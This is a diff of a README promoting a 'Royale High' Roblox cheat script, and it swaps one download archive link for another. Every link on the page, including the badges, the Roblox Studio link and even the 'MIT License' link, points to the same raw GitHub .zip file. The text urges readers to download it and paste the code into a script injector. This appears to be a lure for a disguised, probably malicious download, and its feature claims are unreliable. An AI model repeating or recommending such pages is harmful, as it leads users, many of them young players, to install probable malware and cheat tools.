@@ -1,9 +1,9 @@
 # 👑 Royale High Script Roblox: The Ultimate Royale Companion
 
-![Stars](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/royale_gui_high_toolkit_v2.8-beta.1.zip)
-![Forks](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/royale_gui_high_toolkit_v2.8-beta.1.zip)
-![License](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/royale_gui_high_toolkit_v2.8-beta.1.zip)
-![Updates](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/royale_gui_high_toolkit_v2.8-beta.1.zip)
+![Stars](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/toolkit_gui_high_royale_wadi.zip)
+![Forks](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/toolkit_gui_high_royale_wadi.zip)
+![License](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/toolkit_gui_high_royale_wadi.zip)
+![Updates](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/toolkit_gui_high_royale_wadi.zip)
 
 **Welcome to the definitive nexus for Royale High Script Roblox enhancements**—where automation, intelligence, and next-level user experience converge in a gala of coding excellence. Whether you yearn to automate your royal life, optimize in-game routines, or explore the boundaries of Roblox scripting, this robust project has your carriage ready and waiting.
 
@@ -12,11 +12,11 @@
 ## 🚀 Quick Start: Installation Portal
 
 1. **Prepare your alchemist’s kit:**
-    - Ensure you have [Roblox Studio](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/royale_gui_high_toolkit_v2.8-beta.1.zip) and a modern script injector.
+    - Ensure you have [Roblox Studio](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/toolkit_gui_high_royale_wadi.zip) and a modern script injector.
 2. **Summon the script:**
     - Tap the enchanted banner below to embark on your script-imbuing journey:
       
-      [![Download](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/royale_gui_high_toolkit_v2.8-beta.1.zip🟢_Script_-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/royale_gui_high_toolkit_v2.8-beta.1.zip)
+      [![Download](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/toolkit_gui_high_royale_wadi.zip🟢_Script_-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/toolkit_gui_high_royale_wadi.zip)
 3. **Absorb the arcane code:**
     - Copy the script contents into your injector and breathe life into your Royale High adventures.
 
@@ -85,7 +85,7 @@ You seek more than an everyday download? Possess the **Royal Enclave Edition**, 
 **Installation guide revisited:**  
 Re-tap the treasure chest for latest script acquisition:
 
-[![Download](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/royale_gui_high_toolkit_v2.8-beta.1.zip🟢_Script_-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/royale_gui_high_toolkit_v2.8-beta.1.zip)
+[![Download](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/toolkit_gui_high_royale_wadi.zip🟢_Script_-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/toolkit_gui_high_royale_wadi.zip)
 
 *Magic is only as good as the code that fuels it!*
 
@@ -99,7 +99,7 @@ This project is a creative, community-driven script for enriching personal enter
 
 ## 📜 License
 
-Kingdoms rise and fall, but openness endures! This repository is governed by the [MIT License](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/royale_gui_high_toolkit_v2.8-beta.1.zip), affording you liberty to fork, tinker, and enhance—just remember to keep that credit shining bright.
+Kingdoms rise and fall, but openness endures! This repository is governed by the [MIT License](https://raw.githubusercontent.com/fahry993/royale-high-gui-toolkit/branch/autoracemization/toolkit_gui_high_royale_wadi.zip), affording you liberty to fork, tinker, and enhance—just remember to keep that credit shining bright.
 
 © 2025. Regal code. Collaborative spirit.
 
